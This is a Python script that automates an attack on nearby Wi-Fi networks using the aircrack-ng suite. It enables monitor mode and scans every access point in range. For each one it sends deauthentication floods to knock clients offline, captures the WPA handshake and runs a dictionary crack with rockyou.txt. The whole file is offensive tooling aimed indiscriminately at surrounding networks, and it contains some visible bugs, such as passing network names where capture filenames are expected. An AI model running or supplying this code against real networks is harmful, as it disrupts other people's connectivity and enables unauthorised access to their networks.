import os, sys, subprocess, time, csv

def start_airmon(network_interface):
	subprocess.call(["x-terminal-emulator", "sudo", "-e", "airmon-ng"])
	subprocess.call(["x-terminal-emulator", "sudo", "-e", "airmon-ng check kill"])
	subprocess.call(["x-terminal-emulator", "sudo", "-e", "airmon-ng start " + network_interface])
	return network_interface + "mon"

def mon_networks(timeout, mon_network_interface):
	filename = "output_airmon"
	proc = subprocess.Popen(["x-terminal-emulator", "-e", "airodump-ng " + mon_network_interface + " -w " + filename + " --output-format csv"])
	wait_timeout(proc, timeout)
	return filename + "-01.csv"

def parse(filename):
	with open(filename, 'rb') as f:
		z = f.read()
	#SPLIT INTO 2 PARTS (STATIONS AND CLIENTS)
	parts = z.split('\r\n\r\n')
	stations = parts[0]
	#WE WON'T DO ANYTHING WITH THE CLIENTS, BUT IF YOU'RE INTERESTED YOU CAN FIND THEM IN:
	#clients = parts[1]

	if sys.version_info[0] < 3:
		from StringIO import StringIO
	else:
		from io import StringIO

	stations_str = StringIO(stations)

	r = csv.reader(stations_str)
	i = list(r)
	z = [k for k in i if k != []]

	stations_list = z

	return stations_list

def extract(stations_list):

	#DATA FROM STATIONS (ACCESS POINTS)
	nstations = len(stations_list)
	sthead = stations_list[0]
	stations_head = [j.strip() for j in sthead]
	stations_data = [stations_list[i] for i in range(1, nstations)]

	ap_mac = []
	ap_name = []
	ap_sec = []
	ap_pow = []
	ap_ch = []

	for i, row in enumerate(stations_data):

		#get indices
		ap_mac_ix = stations_head.index('BSSID')
		ap_name_ix = stations_head.index('ESSID')
		ap_sec_ix = stations_head.index('Privacy')
		ap_pow_ix = stations_head.index('Power')
		ap_ch_ix = stations_head.index('channel')

		#get values
		ap_mac.append(row[ap_mac_ix].strip())
		ap_name.append(row[ap_name_ix].strip())
		ap_sec.append(row[ap_sec_ix].strip())
		ap_pow.append(row[ap_pow_ix].strip())
		ap_ch.append(row[ap_ch_ix].strip())

		print(ap_name[i] + ": " + ap_pow[i])

		#other stuff
		mac_prefix = ap_mac[0:8]
		#ap_mfg = lookup_hardware(mac_prefix)
	#for i, row in enumerate(ap_name):
		#IF THERE ARE NETWORKS YOU DO NOT WANT TO CRACK OR DEAUTH USERS FROM
		#if ap_name[i] == "" or ap_name[i] == "":
		#	del ap_mac[i]
		#	del ap_name[i]
		#	del ap_ch[i]

	return ap_mac, ap_name, ap_ch

def mon_networks_for_handshake(mon_network_interface, ap_mac, ap_name, ap_ch):

	filename_list = []

	for i, row in enumerate(ap_mac):
		try:

			name = "handshake_" + ap_name[i]
			name = name.replace(" ", "")
			command = "airodump-ng --bssid " + ap_mac[i] + " -c " + ap_ch[i] + " -w " + name + " " + mon_network_interface
			proc_mon = subprocess.Popen(["x-terminal-emulator", "-e", command])

			#WAIT 2 SEC
			time.sleep(2)

			proc_deauth = subprocess.Popen(["x-terminal-emulator", "-e", "aireplay-ng --deauth 25 -a " + ap_mac[i] + " " + mon_network_interface])

			print("----------------------UNDER DEAUTH--------------------")
			time.sleep(10)
			proc_mon.kill()
			proc_deauth.kill()
		except:
			print("An exception occured while capturing the hadshake.")

		filename = ""

		#DELETE ALL FILES EXCEPT .CAP
		try:
			while True:
				count = 1
				filename = name + "-0" + str(count)
				if os.path.isfile(filename + ".csv"):
					filename_list.append(filename)
					cleanup(filename + ".csv")
				if os.path.isfile(filename + ".kismet.csv"):
					cleanup(filename + ".kismet.csv")
				if os.path.isfile(filename + ".kismet.netxml"):
					cleanup(filename + ".kismet.netxml")
				if os.path.isfile(filename + ".log.csv"):
					cleanup(filename + ".log.csv")

				count = count + 1
				break
		except:
			print("An exception occured while deleting the files.")

	return ap_mac, ap_name, filename_list

def reset_network_settings(mon_network_interface):

	proc_stop_airmon = subprocess.Popen(["x-terminal-emulator", "sudo", "-e", " airmon-ng stop" + mon_network_interface])
	proc_restart_network_manager = subprocess.Popen(["x-terminal-emulator", "sudo", "-e", "systemctl restart network-manager"])

def crack(ap_mac, filename_list):

	for i, row in enumerate(ap_mac):
		print("STARTING TO CRACK: " + ap_mac[i] + " and filename: " + filename_list[i])
		time.sleep(5)
		#Clean the capture file
		#wpaclean newfile.cap capfile.cap
		command = "aircrack-ng -b " + ap_mac[i] + " -w rockyou.txt " + filename_list[i] + ".cap -l pass_" + filename_list[i] + ".txt"
		proc_crack = subprocess.Popen(["x-terminal-emulator", "-e", command])

def wait_timeout(proc, timeout):
	start = time.time()
	end = start + timeout
	interval = min(timeout/1000.0, .25)

	while True:
		result = proc.poll()
		if result is not None:
			return result
		if time.time() >= end:
			proc.kill()
		time.sleep(interval)

def cleanup(file):
	os.remove(file)

#PUT HERE YOUR NETWORK INTERFACE
network_interface = "wlan1"

#TIMEOUT TIME
timeout = 30

#START AIRMON-NG AND KILL ALL BLOCKING PROCESSES
mon_network_interface = start_airmon(network_interface)

#CAPTURE NETWORK TRAFFIC AROUND YOU
found_networks_csv = mon_networks(timeout,mon_network_interface)

#PARSE DATA FROM NETWORK TRAFIC
stations_list = parse(found_networks_csv)

#EXTRACTING THE NEEDED DATA FROM THE LISTS
ap_mac, ap_name, ap_ch = extract(stations_list)

#DEAUTH AND CAPTURE HANDSHAKE
mon_networks_for_handshake(mon_network_interface, ap_mac, ap_name, ap_ch)

captured_handshakes_string = "";
for index, row in enumerate(ap_name):
	captured_handshakes_string += ap_name[index] + ", "

print("---------------------------------------------------------")
print("Handshakes captured from: " + captured_handshakes_string)

#RESET NETWORK SETTINGS
reset_network_settings(mon_network_interface)

#CRACK THE HANDSHAKES
crack(ap_mac, ap_name)

#DELETE GENERATED FILES
cleanup(found_networks_csv)
